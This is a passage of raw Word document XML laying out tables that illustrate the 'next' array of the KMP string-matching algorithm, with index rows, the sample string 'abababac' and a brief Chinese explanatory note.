                                    <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                                    <w:ind w:left="0" w:right="0" w:firstLine="260"/>
                                    <w:jc w:val="left"/>
                                  </w:pPr>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>4 5</w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:tab/>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>6</w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:tab/>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>7</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="195" w:hRule="exact"/>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2</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str:</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 a b</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abac</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="240" w:hRule="exact"/>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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>S</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next:</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-1</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-1</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70" w:hRule="exact"/>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4</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str </w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                                    </w:rPr>
                                    <w:t xml:space="preserve">: </w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>a b</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b a b a c</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="240" w:hRule="exact"/>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5</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Shape 21" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:110.65pt;margin-top:18pt;height:70.5pt;width:259.5pt;mso-position-horizontal-relative:page;mso-wrap-distance-bottom:232.75pt;mso-wrap-distance-top:18pt;z-index:125830144;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="f" coordsize="21600,21600" o:gfxdata="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3eBhMNcAAAAKAQAADwAA&#10;AAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQM0de5mlAQAAZgMA&#10;AA4AAAAAAAAAAQAgAAAAJgEAAGRycy9lMm9Eb2MueG1sUEsFBgAAAAAGAAYAWQEAAD0FAA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465"/>
                        <w:gridCol w:w="585"/>
                        <w:gridCol w:w="465"/>
                        <w:gridCol w:w="1230"/>
                        <w:gridCol w:w="2445"/>
                      </w:tblGrid>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="210" w:hRule="exact"/>
                          <w:tblHeader/>
                        </w:trPr>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20"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>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B</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C D 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 G H I J K</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="255" w:hRule="exact"/>
                        </w:trPr>
                        <w:tc>
                          <w:tcPr>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1</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index</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0</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                        <w:tc>
                          <w:tcPr>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:vAlign w:val="center"/>
                          </w:tcPr>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="17"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="670"/>
                                <w:tab w:val="left" w:pos="1060"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="280"/>
                              <w:jc w:val="left"/>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p>
                        </w:tc>
                        <w:tc>
                          <w:tcPr>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:vAlign w:val="center"/>
                          </w:tcPr>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="17"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="935"/>
                                <w:tab w:val="left" w:pos="1355"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="260"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>4 5</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>6</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>7</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="195" w:hRule="exact"/>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2</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str:</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b a b</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abac</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="240" w:hRule="exact"/>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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>S</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next:</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-1</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-1</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70" w:hRule="exact"/>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4</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str </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>a b</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b a b a c</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="240" w:hRule="exact"/>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5</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widowControl w:val="0"/>
                        <w:spacing w:line="1" w:lineRule="exact"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="1590675" distB="327025" distL="9525" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1414780</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1590675</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3314700" cy="2162175"/>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3314700" cy="2162175"/>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1065"/>
                              <w:gridCol w:w="4155"/>
                            </w:tblGrid>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="255" w:hRule="exact"/>
                                <w:tblHeader/>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680"/>
                                    <w:jc w:val="left"/>
                                  </w:pPr>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>A</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                              <w:tc>
                                <w:tcPr>
                                  <w:tcBorders>
                                    <w:top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BCDEFGHIJK</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="210" w:hRule="exact"/>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lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                                    </w:rPr>
                                    <w:t xml:space="preserve">一 </w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>index</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                              <w:tc>
                                <w:tcPr>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:vAlign w:val="bottom"/>
                                </w:tcPr>
                                <w:p>
                                  <w:pPr>
                                    <w:pStyle w:val="17"/>
                                    <w:keepNext w:val="0"/>
                                    <w:keepLines w:val="0"/>
                                    <w:widowControl w:val="0"/>
                                    <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                                    <w:tabs>
                                      <w:tab w:val="left" w:pos="705"/>
                                      <w:tab w:val="left" w:pos="1125"/>
                                      <w:tab w:val="left" w:pos="1515"/>
                                      <w:tab w:val="left" w:pos="1920"/>
                                      <w:tab w:val="left" w:pos="3045"/>
                                    </w:tabs>
                                    <w:bidi w:val="0"/>
                                    <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                                    <w:ind w:left="0" w:right="0" w:firstLine="300"/>
                                    <w:jc w:val="left"/>
                                  </w:pP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4 5 6</w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:tab/>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>7</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="270" w:hRule="exact"/>
                              </w:trPr>
                              <w:tc>
                                <w:tcPr>
                                  <w:tcBorders>
                                    <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>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 str：</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b a b a b a c</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="240"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 next</w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                                    </w:rPr>
                                    <w:t>:</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                              <w:tc>
                                <w:tcPr>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:vAlign w:val="top"/>
                                </w:tcPr>
                                <w:p>
                                  <w:pPr>
                                    <w:pStyle w:val="17"/>
                                    <w:keepNext w:val="0"/>
                                    <w:keepLines w:val="0"/>
                                    <w:widowControl w:val="0"/>
                                    <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                                    <w:tabs>
                                      <w:tab w:val="left" w:pos="1110"/>
                                    </w:tabs>
                                    <w:bidi w:val="0"/>
                                    <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                                    <w:ind w:left="0" w:right="0" w:firstLine="180"/>
                                    <w:jc w:val="left"/>
                                  </w:pPr>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>-1 -1</w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:tab/>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>0</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="225"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4</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480"/>
                                    <w:jc w:val="left"/>
                                  </w:pPr>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>str</w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                                    </w:rPr>
                                    <w:t xml:space="preserve">: </w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>a b a b a b a c</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="240"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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>5</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810" w:hRule="exact"/>
                              </w:trPr>
                              <w:tc>
                                <w:tcPr>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再比较下一位，相同就比前一个加一。</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="210"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680"/>
                                    <w:jc w:val="left"/>
                                  </w:pPr>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>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B C D E F G E I J K</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="225"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1 </w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>index</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                              <w:tc>
                                <w:tcPr>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:vAlign w:val="top"/>
                                </w:tcPr>
                                <w:p>
                                  <w:pPr>
                                    <w:pStyle w:val="17"/>
                                    <w:keepNext w:val="0"/>
                                    <w:keepLines w:val="0"/>
                                    <w:widowControl w:val="0"/>
                                    <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                                    <w:tabs>
                                      <w:tab w:val="left" w:pos="705"/>
                                      <w:tab w:val="left" w:pos="1515"/>
                                      <w:tab w:val="left" w:pos="1920"/>
                                      <w:tab w:val="left" w:pos="3045"/>
                                    </w:tabs>
                                    <w:bidi w:val="0"/>
                                    <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                                    <w:ind w:left="0" w:right="0" w:firstLine="300"/>
                                    <w:jc w:val="left"/>
                                  </w:pP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4 5 6</w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:tab/>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>7</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="255"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2 </w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>str：</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abababac</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="195" w:hRule="exact"/>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3 </w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>next</w:t>
                                  </w:r>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                                    </w:rPr>
                                    <w:t>:</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                              <w:tc>
                                <w:tcPr>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:vAlign w:val="bottom"/>
                                </w:tcPr>
                                <w:p>
                                  <w:pPr>
                                    <w:pStyle w:val="17"/>
                                    <w:keepNext w:val="0"/>
                                    <w:keepLines w:val="0"/>
                                    <w:widowControl w:val="0"/>
                                    <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                                    <w:tabs>
                                      <w:tab w:val="left" w:pos="1110"/>
                                      <w:tab w:val="left" w:pos="1515"/>
                                    </w:tabs>
                                    <w:bidi w:val="0"/>
                                    <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                                    <w:ind w:left="0" w:right="0" w:firstLine="180"/>
                                    <w:jc w:val="left"/>
                                  </w:pPr>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>-1 -1</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12 3 4</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="270" w:hRule="exact"/>
                              </w:trPr>
                              <w:tc>
                                <w:tcPr>
                                  <w:tcBorders>
                                    <w:left w:val="single" w:color="auto" w:sz="4" w:space="0"/>
                                  </w:tcBorders>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:vAlign w:val="top"/>
                                </w:tcPr>
                                <w:p>
                                  <w:pPr>
                                    <w:widowControl w:val="0"/>
                                    <w:rPr>
                                      <w:sz w:val="10"/>
                                      <w:szCs w:val="10"/>
                                    </w:rPr>
                                  </w:pP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480"/>
                                    <w:jc w:val="left"/>
                                  </w:pPr>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>str: a b a b a b a c</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                          </w:tbl>
                          <w:p>
                            <w:pPr>
                              <w:widowControl w:val="0"/>
                              <w:spacing w:line="1" w:lineRule="exact"/>
                            </w:pPr>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
